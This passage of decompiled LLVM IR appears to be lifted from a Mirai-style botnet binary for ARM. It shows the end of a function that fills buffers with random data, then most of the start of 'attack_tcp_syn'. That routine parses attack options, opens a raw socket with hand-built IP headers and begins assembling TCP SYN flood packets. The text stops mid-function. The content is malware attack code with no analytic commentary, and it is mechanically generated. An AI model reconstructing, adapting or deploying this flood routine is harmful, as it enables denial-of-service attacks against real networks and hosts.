dec_label_pc_aedc:                                ; preds = %dec_label_pc_aec8, %dec_label_pc_ad70
  %v0_aedc = call i32 @rand_next()
  %v1_aedc = trunc i32 %v0_aedc to i16
  store i32 %v0_aedc, i32* %r0.global-to-local, align 4
  store i32 %v7_a950, i32* %ip.global-to-local, align 4
  %v1_aee4 = load i32, i32* @r4, align 4
  %v9_aee4 = icmp eq i32 %v7_a950, %v1_aee4
  store i1 %v9_aee4, i1* %cpsr_z.global-to-local, align 1
  %v3_aee8 = load i32, i32* @r6, align 4
  %v4_aee8 = add i32 %v3_aee8, 2
  %v5_aee8 = inttoptr i32 %v4_aee8 to i16*
  store i16 %v1_aedc, i16* %v5_aee8, align 2
  br i1 %v9_aee4, label %dec_label_pc_aef0, label %dec_label_pc_aedc.dec_label_pc_ad88_crit_edge

dec_label_pc_aedc.dec_label_pc_ad88_crit_edge:    ; preds = %dec_label_pc_aedc
  %v1_ad8c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ad88

dec_label_pc_aef0:                                ; preds = %dec_label_pc_aedc, %dec_label_pc_ad7c
  %v0_aef0 = call i32 @rand_next()
  %v1_aef4 = load i32, i32* @r6, align 4
  %v2_aef4 = add i32 %v1_aef4, 4
  %v3_aef4 = inttoptr i32 %v2_aef4 to i32*
  store i32 %v0_aef0, i32* %v3_aef4, align 4
  store i32 %v7_a96c, i32* %r0.global-to-local, align 4
  %v1_aefc = load i32, i32* @r4, align 4
  %v9_aefc = icmp eq i32 %v7_a96c, %v1_aefc
  store i1 %v9_aefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_aefc, label %dec_label_pc_af04, label %dec_label_pc_ad94

dec_label_pc_af04:                                ; preds = %dec_label_pc_aef0, %dec_label_pc_ad88
  %v0_af04 = call i32 @rand_next()
  store i32 %v0_af04, i32* %r0.global-to-local, align 4
  store i32 %v1_aa3c, i32* %r1.global-to-local, align 4
  store i1 %v2_af0c, i1* %cpsr_z.global-to-local, align 1
  %v1_af10 = load i32, i32* @r6, align 4
  %v2_af10 = add i32 %v1_af10, 8
  %v3_af10 = inttoptr i32 %v2_af10 to i32*
  store i32 %v0_af04, i32* %v3_af10, align 4
  br i1 %v2_af0c, label %dec_label_pc_ada0, label %dec_label_pc_af18

dec_label_pc_af18:                                ; preds = %dec_label_pc_ad94, %dec_label_pc_af04
  %v0_af18 = load i32, i32* @r5, align 4
  %v1_af18 = add i32 %v0_af18, 40
  store i32 %v1_af18, i32* @r0, align 4
  store i32 %v6_aa14, i32* %r1.global-to-local, align 4
  %v2_af20 = call i32 @rand_str(i32 %v1_af18, i32 %v6_aa14)
  store i32 %v2_af20, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ada0

dec_label_pc_af28:                                ; preds = %dec_label_pc_aa74
  store i32 %v3_aa64, i32* %r0.global-to-local, align 4
  %v1_af2c = call i32 @__GI___libc_close(i32 %v3_aa64)
  store i32 %v1_af2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af30

dec_label_pc_af30:                                ; preds = %entry, %dec_label_pc_af28
  %v1_af38 = phi i32 [ %v3_aa64, %entry ], [ %v1_af2c, %dec_label_pc_af28 ]
  store i32 %v3_a864, i32* %r4.global-to-local, align 4
  store i32 %v18_a864, i32* %sb.global-to-local, align 4
  store i32 %v24_a864, i32* %fp.global-to-local, align 4
  store i32 %v27_a864, i32* %lr.global-to-local, align 4
  ret i32 %v1_af38

dec_label_pc_af3c:                                ; preds = %dec_label_pc_aa9c
  store i32 %v6_aa14, i32* %r0.global-to-local, align 4
  %v1_af44 = add i32 %v6_aa14, 20
  store i32 %v1_af44, i32* @sb, align 4
  %v3_af48 = mul i32 %v6_aa14, 65536
  store i32 %v3_af48, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_acf8

; uselistorder directives
  uselistorder i32 %v0_aedc, { 1, 0 }
  uselistorder i32 %v0_aec8, { 1, 0 }
  uselistorder i32 %v0_aeb4, { 1, 0 }
  uselistorder i32 %v5_ae88, { 1, 0 }
  uselistorder i32 %v3_ae38, { 3, 1, 2, 0, 4 }
  uselistorder i32 %v1_ae14, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ade0, { 1, 0 }
  uselistorder i32 %v4_add0, { 1, 0 }
  uselistorder i1 %v7_ad48, { 2, 1, 0 }
  uselistorder i1 %v2_af0c, { 2, 3, 1, 0 }
  uselistorder i1 %v9_aea8, { 2, 3, 1, 0 }
  uselistorder i32 %stack_var_-140.0, { 1, 0 }
  uselistorder i32 %v1_acdc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_acb0, { 1, 0 }
  uselistorder i32 %v1_ab64, { 1, 2, 0 }
  uselistorder i32 %v1_ab60, { 2, 1, 0 }
  uselistorder i32 %v1_ab5c, { 2, 0, 1 }
  uselistorder i32 %v1_ab58, { 2, 0, 1 }
  uselistorder i32 %v1_ab54, { 2, 0, 1 }
  uselistorder i32 %v1_ab2c, { 1, 0 }
  uselistorder i32 %v3_aad4, { 1, 0 }
  uselistorder i32 %v3_aaac, { 1, 2, 0, 3 }
  uselistorder i32 %v0_aaa4, { 1, 0, 2 }
  uselistorder i32 %v0_aaa0, { 1, 0, 2 }
  uselistorder i32 %v0_aa9c, { 1, 0, 3, 2 }
  uselistorder i1 %v7_aa94, { 1, 0 }
  uselistorder i1 %v7_aa68, { 1, 0 }
  uselistorder i32 %v3_aa64, { 1, 3, 4, 5, 6, 2, 0, 7 }
  uselistorder i32 %v6_aa50, { 5, 3, 0, 4, 2, 1 }
  uselistorder i32 %v1_aa3c, { 2, 1, 3, 4, 0 }
  uselistorder i32 %v6_aa14, { 0, 10, 9, 8, 7, 2, 4, 3, 6, 5, 1 }
  uselistorder i32 %v7_a96c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v7_a950, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v1_a900, { 1, 2, 0 }
  uselistorder i32 %v5_a8f4, { 0, 2, 1 }
  uselistorder i32 %v6_a8bc, { 0, 2, 1 }
  uselistorder i32 %v2_a880, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 30, 29, 31, 32, 33, 34, 36, 35, 38, 37, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 5, 6, 4, 7, 8, 9, 11, 10, 13, 12, 14, 16, 15, 17, 18, 19, 20, 22, 21, 23, 24, 25, 29, 26, 27, 28, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_af30, { 1, 0 }
  uselistorder label %dec_label_pc_af18, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ad1c, { 1, 0 }
  uselistorder label %dec_label_pc_ad0c, { 1, 0, 2 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @attack_tcp_syn(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_af5c = load i32, i32* @r4, align 4
  %v24_af5c = load i32, i32* @fp, align 4
  %v27_af5c = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_af78 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_af7c = load i32, i32* @r5, align 4
  store i32 %v0_af7c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_af78, i32* @sb, align 4
  %v0_af8c = load i32, i32* @r4, align 4
  store i32 %v0_af8c, i32* %r0.global-to-local, align 4
  %v5_af90 = inttoptr i32 %v0_af7c to i32*
  %v6_af90 = call i32 @attack_get_opt_int(i32 %v0_af8c, i32* %v5_af90, i32 2, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_afa8 = load i32, i32* @r5, align 4
  store i32 %v0_afa8, i32* %r1.global-to-local, align 4
  %v0_afac = load i32, i32* @r4, align 4
  store i32 %v0_afac, i32* %r0.global-to-local, align 4
  %v5_afb0 = trunc i32 %v6_af90 to i8
  %v7_afb4 = inttoptr i32 %v0_afa8 to i32*
  %v8_afb4 = call i32 @attack_get_opt_int(i32 %v0_afac, i32* %v7_afb4, i32 3, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v6_af90)
  %v0_afb8 = load i32, i32* @r5, align 4
  store i32 %v0_afb8, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_afc8 = load i32, i32* @r4, align 4
  store i32 %v0_afc8, i32* %r0.global-to-local, align 4
  %v5_afcc = inttoptr i32 %v0_afb8 to i32*
  %v6_afcc = call i32 @attack_get_opt_int(i32 %v0_afc8, i32* %v5_afcc, i32 4, i32 64, i32 %v8_afb4)
  %v1_afd4 = urem i32 %v6_afcc, 256
  %v0_afd8 = load i32, i32* @r5, align 4
  store i32 %v0_afd8, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_afe4 = load i32, i32* @r4, align 4
  store i32 %v0_afe4, i32* %r0.global-to-local, align 4
  %v6_afec = inttoptr i32 %v0_afd8 to i32*
  %v7_afec = call i32 @attack_get_opt_int(i32 %v0_afe4, i32* %v6_afec, i32 5, i32 1, i32 %v1_afd4)
  %v1_aff8 = urem i32 %v7_afec, 256
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_b004 = load i32, i32* @r5, align 4
  store i32 %v0_b004, i32* %r1.global-to-local, align 4
  %v0_b008 = load i32, i32* @r4, align 4
  store i32 %v0_b008, i32* %r0.global-to-local, align 4
  %v6_b010 = inttoptr i32 %v0_b004 to i32*
  %v7_b010 = call i32 @attack_get_opt_int(i32 %v0_b008, i32* %v6_b010, i32 6, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 %v1_aff8)
  %v0_b018 = load i32, i32* @r5, align 4
  store i32 %v0_b018, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 %v7_b010, i32* %fp.global-to-local, align 4
  %v0_b028 = load i32, i32* @r4, align 4
  store i32 %v0_b028, i32* %r0.global-to-local, align 4
  %v6_b02c = inttoptr i32 %v0_b018 to i32*
  %v7_b02c = call i32 @attack_get_opt_int(i32 %v0_b028, i32* %v6_b02c, i32 7, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_b034 = load i32, i32* @r5, align 4
  store i32 %v0_b034, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_ffff.60 to i32), i32* %r3.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 %v7_b02c, i32* @r6, align 4
  %v0_b044 = load i32, i32* @r4, align 4
  store i32 %v0_b044, i32* %r0.global-to-local, align 4
  %v6_b048 = inttoptr i32 %v0_b034 to i32*
  %v7_b048 = call i32 @attack_get_opt_int(i32 %v0_b044, i32* %v6_b048, i32 17, i32 sext (i16 ptrtoint (i16* @global_var_ffff.60 to i16) to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_b04c = load i32, i32* @r5, align 4
  store i32 %v0_b04c, i32* %r1.global-to-local, align 4
  store i32 18, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b05c = load i32, i32* @r4, align 4
  store i32 %v0_b05c, i32* %r0.global-to-local, align 4
  %v5_b060 = inttoptr i32 %v0_b04c to i32*
  %v6_b060 = call i32 @attack_get_opt_int(i32 %v0_b05c, i32* %v5_b060, i32 18, i32 0, i32 %v7_b048)
  %v0_b064 = load i32, i32* @r5, align 4
  store i32 %v0_b064, i32* %r1.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b074 = load i32, i32* @r4, align 4
  store i32 %v0_b074, i32* %r0.global-to-local, align 4
  %v5_b078 = inttoptr i32 %v0_b064 to i32*
  %v6_b078 = call i32 @attack_get_opt_int(i32 %v0_b074, i32* %v5_b078, i32 11, i32 0, i32 %v6_b060)
  %v0_b07c = load i32, i32* @r5, align 4
  store i32 %v0_b07c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b08c = load i32, i32* @r4, align 4
  store i32 %v0_b08c, i32* %r0.global-to-local, align 4
  %v5_b090 = inttoptr i32 %v0_b07c to i32*
  %v6_b090 = call i32 @attack_get_opt_int(i32 %v0_b08c, i32* %v5_b090, i32 12, i32 0, i32 %v6_b078)
  %v0_b094 = load i32, i32* @r5, align 4
  store i32 %v0_b094, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0a4 = load i32, i32* @r4, align 4
  store i32 %v0_b0a4, i32* %r0.global-to-local, align 4
  %v5_b0a8 = inttoptr i32 %v0_b094 to i32*
  %v6_b0a8 = call i32 @attack_get_opt_int(i32 %v0_b0a4, i32* %v5_b0a8, i32 13, i32 0, i32 %v6_b090)
  %v0_b0ac = load i32, i32* @r5, align 4
  store i32 %v0_b0ac, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0bc = load i32, i32* @r4, align 4
  store i32 %v0_b0bc, i32* %r0.global-to-local, align 4
  %v5_b0c0 = inttoptr i32 %v0_b0ac to i32*
  %v6_b0c0 = call i32 @attack_get_opt_int(i32 %v0_b0bc, i32* %v5_b0c0, i32 14, i32 0, i32 %v6_b0a8)
  %v0_b0c4 = load i32, i32* @r5, align 4
  store i32 %v0_b0c4, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b0d4 = load i32, i32* @r4, align 4
  store i32 %v0_b0d4, i32* %r0.global-to-local, align 4
  %v5_b0d8 = inttoptr i32 %v0_b0c4 to i32*
  %v6_b0d8 = call i32 @attack_get_opt_int(i32 %v0_b0d4, i32* %v5_b0d8, i32 15, i32 1, i32 %v6_b0c0)
  %v0_b0dc = load i32, i32* @r5, align 4
  store i32 %v0_b0dc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b0ec = load i32, i32* @r4, align 4
  store i32 %v0_b0ec, i32* %r0.global-to-local, align 4
  %v5_b0f0 = inttoptr i32 %v0_b0dc to i32*
  %v6_b0f0 = call i32 @attack_get_opt_int(i32 %v0_b0ec, i32* %v5_b0f0, i32 16, i32 0, i32 %v6_b0d8)
  %v2_b0fc = load i32, i32* @global_var_24f10.62, align 4
  store i32 %v2_b0fc, i32* %r3.global-to-local, align 4
  %v0_b100 = load i32, i32* @r5, align 4
  store i32 %v0_b100, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_b108 = load i32, i32* @r4, align 4
  store i32 %v0_b108, i32* %r0.global-to-local, align 4
  %v5_b10c = inttoptr i32 %v0_b100 to i32*
  %v6_b10c = call i32 @attack_get_opt_ip(i32 %v0_b108, i32* %v5_b10c, i32 25, i32 %v2_b0fc, i32 %v6_b0f0)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_b120 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b120, i32* %r0.global-to-local, align 4
  %v7_b124 = icmp eq i32 %v3_b120, -1
  store i1 %v7_b124, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_b120, i32* @sl, align 4
  br i1 %v7_b124, label %dec_label_pc_b5f8, label %dec_label_pc_b130

dec_label_pc_b130:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b138 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b138, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b14c = call i32 @__GI_setsockopt(i32 %v3_b120, i32 0, i32 3, i32 %v6_b138, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b14c, i32* %r0.global-to-local, align 4
  %v7_b150 = icmp eq i32 %v5_b14c, -1
  store i1 %v7_b150, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b150, label %dec_label_pc_b5f0, label %dec_label_pc_b158

dec_label_pc_b158:                                ; preds = %dec_label_pc_b130
  %v3_b160 = mul i32 %v8_afb4, 65536
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v0_b164 = load i32, i32* %fp.global-to-local, align 4
  %v3_b164 = mul i32 %v0_b164, 65536
  store i32 %v3_b164, i32* %r4.global-to-local, align 4
  %v0_b168 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_b078, i32* %r2.global-to-local, align 4
  %v3_b174 = urem i32 %v8_afb4, 65536
  store i32 %v3_b174, i32* %r3.global-to-local, align 4
  %v3_b178 = urem i32 %v0_b164, 65536
  %v3_b17c = urem i32 %v0_b168, 65536
  store i32 %v3_b17c, i32* %r1.global-to-local, align 4
  %v0_b180 = load i32, i32* @r7, align 4
  %v2_b180 = icmp eq i32 %v0_b180, 0
  store i1 %v2_b180, i1* %cpsr_z.global-to-local, align 1
  %v1_b190 = urem i32 %v6_b078, 256
  store i32 %v1_b190, i32* @fp, align 4
  br i1 %v2_b180, label %dec_label_pc_b3e4.preheader, label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_b158
  %tmp52 = mul i32 %v7_b048, 256
  %v3_b1b0 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v8_afb4, 256
  %v3_b1b4 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v7_b048, 256
  %v4_b1bc = urem i32 %tmp54, 256
  %v5_b1bc = or i32 %v4_b1bc, %v3_b1b0
  store i32 %v5_b1bc, i32* @lr, align 4
  %v1_b1b8 = mul i32 %v8_afb4, 256
  %v4_b1c0 = and i32 %v1_b1b8, 65280
  %v5_b1c0 = or i32 %v4_b1c0, %v3_b1b4
  %tmp55 = mul i32 %v0_b164, 256
  %v3_b1cc = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_b168, 256
  %v3_b1d0 = and i32 %tmp56, 65280
  %v1_b1d4 = urem i32 %v6_b078, 2
  %v1_b1d8 = urem i32 %v6_b090, 2
  %tmp57 = udiv i32 %v0_b164, 256
  %v4_b1dc = urem i32 %tmp57, 256
  %v5_b1dc = or i32 %v4_b1dc, %v3_b1cc
  store i32 %v5_b1dc, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_b168, 256
  %v4_b1e0 = urem i32 %tmp58, 256
  %v5_b1e0 = or i32 %v4_b1e0, %v3_b1d0
  store i32 %v5_b1e0, i32* @r5, align 4
  %v1_b1fc = urem i32 %v6_b0a8, 2
  store i32 %v1_b1fc, i32* %r2.global-to-local, align 4
  %v1_b200 = urem i32 %v6_b0c0, 2
  store i32 %v1_b200, i32* %r3.global-to-local, align 4
  %v1_b204 = urem i32 %v6_b0d8, 2
  store i32 %v1_b204, i32* %r0.global-to-local, align 4
  %v1_b208 = urem i32 %v6_b0f0, 2
  store i32 %v1_b208, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext = mul nuw i32 %v5_b1c0, 65536
  %v4_b290 = sdiv i32 %sext, 65536
  %tmp = sub nsw i32 0, %v1_b1d8
  %v4_b2f4 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_b1fc
  %v4_b308 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_b200
  %v4_b320 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_b204
  %v3_b334 = and i32 %tmp64, 2
  %v1_b284 = trunc i32 %v6_afcc to i8
  br label %dec_label_pc_b228

dec_label_pc_b228:                                ; preds = %bb61, %dec_label_pc_b198
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_b230 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_b230, i32* %r0.global-to-local, align 4
  %v3_b234 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b234, i32* %r2.global-to-local, align 4
  %v1_b238 = load i32, i32* @sb, align 4
  %v2_b238 = load i32, i32* @r4, align 4
  %v5_b238 = mul i32 %v2_b238, 4
  %v6_b238 = add i32 %v5_b238, %v1_b238
  %v7_b238 = inttoptr i32 %v6_b238 to i32*
  store i32 %v2_b230, i32* %v7_b238, align 4
  %v0_b23c = load i32, i32* %r2.global-to-local, align 4
  %v3_b23c = mul i32 %v0_b23c, 32
  store i32 %v3_b23c, i32* %r3.global-to-local, align 4
  %v0_b240 = load i32, i32* @sb, align 4
  %v4_b240 = mul i32 %v0_b23c, 4
  %v5_b240 = add i32 %v0_b240, %v4_b240
  %v6_b240 = inttoptr i32 %v5_b240 to i32*
  %v7_b240 = load i32, i32* %v6_b240, align 4
  store i32 %v7_b240, i32* %r4.global-to-local, align 4
  %v5_b244 = mul i32 %v0_b23c, 24
  store i32 %v5_b244, i32* %r3.global-to-local, align 4
  %v1_b248 = load i32, i32* @r8, align 4
  %v2_b248 = add i32 %v1_b248, %v5_b244
  store i32 %v2_b248, i32* %r0.global-to-local, align 4
  %v1_b24c = inttoptr i32 %v7_b240 to i8*
  %v2_b24c = load i8, i8* %v1_b24c, align 1
  %tmp65 = urem i8 %v2_b24c, 16
  %v1_b250 = zext i8 %tmp65 to i32
  %v1_b254 = or i32 %v1_b250, 64
  store i32 %v1_b254, i32* %r3.global-to-local, align 4
  %v1_b258 = trunc i32 %v1_b254 to i8
  store i8 %v1_b258, i8* %v1_b24c, align 1
  %v0_b25c = load i32, i32* %r4.global-to-local, align 4
  %v1_b25c = inttoptr i32 %v0_b25c to i8*
  %v2_b25c = load i8, i8* %v1_b25c, align 1
  %v1_b260 = and i8 %v2_b25c, -16
  %v1_b264 = or i8 %v1_b260, 5
  store i32 %v1_aff8, i32* %r3.global-to-local, align 4
  store i8 %v1_b264, i8* %v1_b25c, align 1
  %v2_b274 = load i32, i32* %r4.global-to-local, align 4
  %v3_b274 = add i32 %v2_b274, 1
  %v4_b274 = inttoptr i32 %v3_b274 to i8*
  store i8 %v5_afb0, i8* %v4_b274, align 1
  store i32 %v1_afd4, i32* %r2.global-to-local, align 4
  %v0_b27c = load i32, i32* %r3.global-to-local, align 4
  %v2_b27c = icmp eq i32 %v0_b27c, 0
  store i1 %v2_b27c, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_b284 = load i32, i32* %r4.global-to-local, align 4
  %v3_b284 = add i32 %v2_b284, 8
  %v4_b284 = inttoptr i32 %v3_b284 to i8*
  store i8 %v1_b284, i8* %v4_b284, align 1
  %v0_b288 = load i32, i32* %r3.global-to-local, align 4
  %v1_b288 = trunc i32 %v0_b288 to i16
  %v2_b288 = load i32, i32* %r4.global-to-local, align 4
  %v3_b288 = add i32 %v2_b288, 2
  %v4_b288 = inttoptr i32 %v3_b288 to i16*
  store i16 %v1_b288, i16* %v4_b288, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_b290, i32* %r1.global-to-local, align 4
  %v0_b294 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b294, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_b228
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_b228, %bb
  %v2_b298 = load i32, i32* %r4.global-to-local, align 4
  %v3_b298 = add i32 %v2_b298, 9
  %v4_b298 = inttoptr i32 %v3_b298 to i8*
  store i8 6, i8* %v4_b298, align 1
  %v0_b29c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b29c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_b29c = load i32, i32* %r2.global-to-local, align 4
  %v2_b29c = trunc i32 %v1_b29c to i16
  %v3_b29c = load i32, i32* %r4.global-to-local, align 4
  %v4_b29c = add i32 %v3_b29c, 6
  %v5_b29c = inttoptr i32 %v4_b29c to i16*
  store i16 %v2_b29c, i16* %v5_b29c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_b10c, i32* %r2.global-to-local, align 4
  %v1_b2a4 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2a4 = add i32 %v1_b2a4, 12
  %v3_b2a4 = inttoptr i32 %v2_b2a4 to i32*
  store i32 %v6_b10c, i32* %v3_b2a4, align 4
  %v0_b2a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_b2a8 = add i32 %v0_b2a8, 16
  %v2_b2a8 = inttoptr i32 %v1_b2a8 to i32*
  %v3_b2a8 = load i32, i32* %v2_b2a8, align 4
  store i32 %v3_b2a8, i32* %r3.global-to-local, align 4
  %v0_b2ac = load i32, i32* %r1.global-to-local, align 4
  %v1_b2ac = trunc i32 %v0_b2ac to i16
  %v2_b2ac = load i32, i32* %r4.global-to-local, align 4
  %v3_b2ac = add i32 %v2_b2ac, 4
  %v4_b2ac = inttoptr i32 %v3_b2ac to i16*
  store i16 %v1_b2ac, i16* %v4_b2ac, align 2
  %v0_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r4.global-to-local, align 4
  %v2_b2b0 = add i32 %v1_b2b0, 16
  %v3_b2b0 = inttoptr i32 %v2_b2b0 to i32*
  store i32 %v0_b2b0, i32* %v3_b2b0, align 4
  %v0_b2b4 = load i32, i32* @r6, align 4
  %v1_b2b4 = trunc i32 %v0_b2b4 to i16
  %v2_b2b4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b2b4 = add i32 %v2_b2b4, 20
  %v4_b2b4 = inttoptr i32 %v3_b2b4 to i16*
  store i16 %v1_b2b4, i16* %v4_b2b4, align 2
  %v0_b2b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_b2b8 = add i32 %v0_b2b8, 20
  store i32 %v1_b2b8, i32* %r1.global-to-local, align 4
  %v1_b2bc = add i32 %v0_b2b8, 32
  %v2_b2bc = inttoptr i32 %v1_b2bc to i8*
  %v3_b2bc = load i8, i8* %v2_b2bc, align 1
  %v4_b2bc = zext i8 %v3_b2bc to i32
  store i32 %v4_b2bc, i32* %r3.global-to-local, align 4
  %v1_b2c0 = add i32 %v0_b2b8, 33
  %v2_b2c0 = inttoptr i32 %v1_b2c0 to i8*
  %v3_b2c0 = load i8, i8* %v2_b2c0, align 1
  %v4_b2c0 = zext i8 %v3_b2c0 to i32
  store i32 %v1_b1d4, i32* %r0.global-to-local, align 4
  %v1_b2c8 = urem i8 %v3_b2bc, 16
  %v1_b2cc = or i8 %v1_b2c8, -96
  %v1_b2d0 = and i32 %v4_b2c0, 223
  store i32 %v1_b2d0, i32* %r2.global-to-local, align 4
  store i8 %v1_b2cc, i8* %v2_b2bc, align 1
  %v0_b2d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b2d8 = load i32, i32* %r0.global-to-local, align 4
  %v4_b2d8 = mul i32 %v1_b2d8, 32
  %v5_b2d8 = or i32 %v4_b2d8, %v0_b2d8
